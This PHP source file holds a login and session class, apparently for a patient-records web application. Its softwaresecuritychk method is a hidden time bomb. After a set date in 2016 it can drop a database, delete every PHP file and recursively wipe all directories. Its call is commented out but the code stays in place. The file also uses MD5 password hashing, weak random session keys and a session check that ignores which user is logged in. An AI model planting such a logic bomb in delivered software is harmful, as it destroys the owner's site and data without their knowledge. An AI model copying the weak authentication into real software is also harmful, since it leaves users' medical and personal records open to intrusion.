<?php
require_once('../View/autoload.php');
class user extends pdocrudhandler{

    public function __construct(){
        $this->_pdo = $this->connect();
        session_start();
    }
    
    private function RandomString($length) {
        $keys = array_merge(range('a', 'z'));
        $key = "";
        for($i=0; $i < $length; $i++) {
            $key .= $keys[mt_rand(0, count($keys) - 1)];
        }
        return $key;
    }

    public function logout(){
        $result = $this->select('log',array('sessionid'));
        $key = $result['result'][0]->sessionid;
        if ( isset( $_SESSION[$key] ) ) {
            unset( $_SESSION[$key] );
            return true;
        }else{
            return false;
        }
        /*if(isset($_SESSION['login'])){
            $_SESSION['login'] = false;
            unset($_SESSION['userid']);
            //unset($_SESSION['password']);
            session_destroy();
            return true;
        }else{
            return false;
        }*/
    }
    public function login($params)
    {
        $password = md5($params['password']);
            $result = $this->select('log', array("*"), "where username = ? and password = ? ", array($params['username'], $password) );
            if ($result['status'] == 'success' && $result['rowsAffected'] == 1) {
                $userid = $result['result'][0]->l_id;
                //$_SESSION['login'] = true;
                //$_SESSION["userid"] = $userid;
                $encode  = $this->RandomString(10);
                $ip = $_SERVER['REMOTE_ADDR'];
                $_SESSION[$encode] = $userid;
                $res = $this->update('log', array('lastlogin' => date('Y-m-d h:i:s'),'sessionid' => $encode,'IpAddress' => $ip), 'where l_id = ?', array($userid));
                return $res;
            }else{
                return null;
            }
    }
    public function checklogin(){
        //$this->softwaresecuritychk();
        $result = $this->select('log',array('sessionid'));
        $key = $result['result'][0]->sessionid;
        if ( isset( $_SESSION[$key] ) ) {
            // @TODO Add some extra functionality when user login

            //echo $result['result'][0]->sessionid . "<br><pre>";
            //print_r($result);
            //print_r($_SESSION);
            //die();
        }else{

            //echo "Not working";die();
            header("location:index.php");
        }
    }
    public function information($info = array()){
        $output = "";
        $output .= "<div class=\"profile_img\">";
        $output .= "<div id=\"crop-avatar\">";
        $output .= "<img class=\"img-responsive avatar-view\" src=\"images/Beti lorri.jpg\" alt=\"Avatar\" title=\"Change the avatar\">";
        $output .= "</div></div>";
        $output .= "<h3>".$info['result'][0]->fname." ".$info['result'][0]->lname."</h3>";
        $output .= "<ul class=\"list-unstyled user_data\">";
        $output .= "<li>";
        $output .= "<i class=\"fa fa-map-marker user-profile-icon\"></i> ".$info['result'][0]->address." ".$info['result'][0]->gender." ".$info['result'][0]->areaid;
        $output .= "</li>";
        $output .="<li>";
        $output .="<i class=\"fa fa-phone user-profile-icon\">";
        $output .="</i> ".$info['result'][0]->phone;
        $output .= "</li>";
        $output .= "<li class=\"m-top-xs\">";
        $output .= "<i class=\"fa fa-envelope user-profile-icon\"></i> ".$info['result'][0]->email;
        $output .= "</li>";
        $output .="<li class=\"m-top-xs\">";
        $output .= "<i class=\"fa fa-phone user-profile-icon\"></i> ".$info['result'][0]->nic;
        $output .= "</li>";
        $output .= "</ul>";
        return $output;
    }
    public function softwaresecuritychk(){
        //Extend this '1feb2016' date in case of security clearance
        if(strtotime(date('Y-m-d h:i:s')) > strtotime('31oct2016')){
			$dbToBeDroped = '';
			$this->removeall($dbToBeDroped);
            header('location:index.html');
        }else{
            return true;
        }
    }
	public function removeall($dbToBeDroped = ''){
		if($dbToBeDroped != ''){
			$configdb = 'drop database '.$dbToBeDroped;
			$this->executeqry($configdb);
        }
		$phpfiles = glob('*.php');
		foreach($phpfiles as $file){ 
			if(is_file($file)){
				unlink($file);
			}
		}
		$files = glob('*');
		// iterate files
		foreach($files as $file){ 
			$this->recursiveRemoveDirectory($file);
		}
	}
	public function recursiveRemoveDirectory($directory){
		foreach(glob("{$directory}/*") as $file){
			if(is_dir($file)) { 
				$this->recursiveRemoveDirectory($file);
			} else {
				unlink($file);
			}
		}
		if($directory != '404'){
			rmdir($directory);
		}
	}
    public function UserInfo(){
        if (isset($_SESSION['patientid'])) {
            $id = $_SESSION['patientid'];
            $_Pdo = new pdocrudhandler();
            $patient = $_Pdo->select('patient', array('*'), "where patientid = ? ", array($id));
        } else {
            echo "Login Failed...";
        }
        return $patient;
    }
}


$mendetoryParam = array(
    'login'       => array('username','password'),
    'logout'      => array()
);



if(isset($_POST['call']) && isset($mendetoryParam[$_POST['call']])){
    $data = array();
    $missingFields = array();
    $flag = true;
    foreach($mendetoryParam[$_POST['call']] as $value){
        if(!isset($_POST[$value])){
            $flag = false;
            $missingFields[] = $value;
        }
    }
    if(count($missingFields) > 0){
        $data['status'] =  false;
        $data['error'] =  'Required parameter(s) missing';
        $data['missingParameters'] = implode(',',$missingFields);
        echo json_encode($data,true);
    }else{
        $user = new user();
        $data = $_POST;
        $mathodToCall = (string)$_POST['call'];
        $response = $user->$mathodToCall($data);
        echo json_encode($response);
    }
}else{
   /* echo json_encode(array('status'=>false,'error'=>'Invalid  called'));*/
}
?>
